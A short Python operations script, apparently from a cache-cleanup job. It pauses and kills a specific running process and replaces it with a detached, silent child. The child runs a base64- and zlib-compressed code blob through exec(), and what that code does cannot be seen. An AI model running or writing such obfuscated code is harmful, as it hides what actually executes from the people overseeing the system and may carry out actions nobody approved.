import os,signal,pathlib,json,time,subprocess,sys,base64
out=pathlib.Path('/mnt/afs/260010165/behavior_1k/operational_cleanup/20261023-round2-direct');pid=3783
p=pathlib.Path('/proc')/str(pid)
result={}
if (out/'cache_release.json').exists():result={'state':'already_completed'}
elif p.exists() and p.joinpath('stat').read_text().split()[21]=='2533777515':
 os.kill(pid,signal.SIGSTOP)
 try:
  m=json.loads((out/'cache_manifest.json').read_text());roots=[pathlib.Path(x) for x in m['roots']]
  missing=sum(not os.path.lexists(roots[f['root']]/f['path']) for f in m['files'])
  if missing:result={'state':'original_continues','already_absent':missing}
  else:
   os.kill(pid,signal.SIGTERM);os.kill(pid,signal.SIGCONT)
   for i in range(20):
    if not p.exists() or p.joinpath('stat').read_text().split()[2]=='Z':break
    time.sleep(.1)
   assert not p.exists() or p.joinpath('stat').read_text().split()[2]=='Z'
   child=subprocess.Popen([sys.executable,'-c',"import base64,zlib;exec(zlib.decompress(base64.b64decode('eJytVk1z2zYQvftXYNQDSYeiPmI5iRKeOkknp2bi3mwNByKXFiISRAHQturxf+8DQMmSm7Q59EKQ4GLx3u7bBUSrOm2Z4nbTiHX6zXTyTOXDZ/YFYzyatNJOeG0m88vpdDadXS4ma9rwO9HpYraddIo0t6KTvCnKhrjs1WQ+nV/OpvPXY931spqPK6GptKPkzOrd8ozRA5XxSIS9O5PutzeWW48htaKldMONm76RXW9PMUX/G6YouZGa3+cx9phEJS83VLRcipqMzRyUKMk08apY7yyZOHnf5m42azpemRgrsZ4bQyDSXkeOAEWrPI803Qm6L9zSXcS4rNj0Awx403QlbAZ/0erD5fQcqC7Oz1/DEf7eU5U/RnsyYwkad7SYvpuOA4Hpm/FsgQWXUfpfVrO3F++OrTy6sQHFlo9v3fuz8dvFYnHi0moujXAxfGn6Zj6fX/yk6WK6uIieEOKusya/PkmiSljdaaaYkC523iRarW7kYdZPLW8kGyKskArTNXcUJ3mufFRVprgmaTPJW0LcXXibMcz6xpqxEe1Y99KpKTo1P1rldhoiP9jsZx+DIMD1nmuFgStVccsdIw9Sd6Wze6FNNw3ZCEsaIosTx0DUTHbWr/DuM2EqcSss/pYdAMqeYOXKA4OPS10517FbMYnq6qVD5o1t3hmvz0bIbVxXif9DDyUpy36/+qh1p483YA4Il7vYZlCDtuZeALKxOtbJq2gShZToQ/CTpebCEPsaguj9xdGvCJNAIIj5+DBjRdMwFJ1k653nSMaw6NWBrYM1gPpCuhXGQCwBnEJub+SNrKhmRnJlNp2FNBxFk6uscaJF2WmyvUZGtstbwgwAmxTlVkSvtgHz1mFGBYq/XL5ah7aQBq9CdnhWdIendGFy0oVMthDbU9i35RY0TIwAt+kP93Zf2VXx+errx99ig/gVbVdR4jUD/cQvgXGI1Hm8Xq88Qp6uPcZ4D9IPSRofoz28uvkAHc8q2AUSeIoyTOz5hNHNDMwOFJMVYv8L+xrqhhHyxYL2WSdLes/QKce1aIh5tmxNKIQhoZq+oUMajKrhJarD2Zls0H5w4qrEySf2crmuQx2jjCd4dXURrZKh2EKe6qHcvS9k4Li8T7pDWHNS8d/578h96gFWaaobcbuxQCmFQTrBBRsSs1BoLbSxrPdxGgi8ALLcd/FBC3X6L4zQ0AjHikGvvl69JydkdLfV9x2DoMp/7Oy5OTxvrb5fd1ddr0sU3YbLW6Sj6rWQt2w44NxJ5nuCygJPr9yAMkPjIlnF9VEhDt0BwWe0DBT2Zo8B2tIlViVp5P+GT0qekkBTpPDuqBqc4lTFYIzmBMLplnZ5w9t1xdnDsiEZnyTu4XoWJIHuAhd3pA3lf+iefN05AoOWxGqCHaCA1je9fyAfWkfo9Tgzw+G7jMquVQ0Bkiun4SgvzIbPccAthztFFr79AZ5t6AG9GFYxuPqs4dxuuzt48PD3UcTfF+f3s53p2xgp3TeW88Vs/iz3IwfrXeEVsHwMTffnFjqFHLSDrhJKCRlwRiT71l13KMQteRoSZqIhreg0W4HMAqa7owzvqzTy5+LSPTP3cPTXvNz2Crz+7BEQt+QTbwyhUR7fkAZc+wvSvUafKyw92Nhfjqq+Vbgc+cSkAi1W2nyeIIO4AQ45/OgHnAJBf2c46Caj4Lwil73CY/c7jH60w+PI7hSNlu4JZWZF4Q6bokhHfvHooNjk7G9FncTC')))"],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
   result={'state':'restarted_before_any_delete','pid':child.pid}
 finally:
  if p.exists() and p.joinpath('stat').read_text().split()[2]=='T':os.kill(pid,signal.SIGCONT)
else:result={'state':'identity_changed_no_action'}
(out/'cache_executor_adjustment.json').write_text(json.dumps(result))
print('B1KRUNTIMEBEGIN'+base64.b64encode(json.dumps(result).encode()).decode()+'B1KRUNTIMEEND',flush=True)
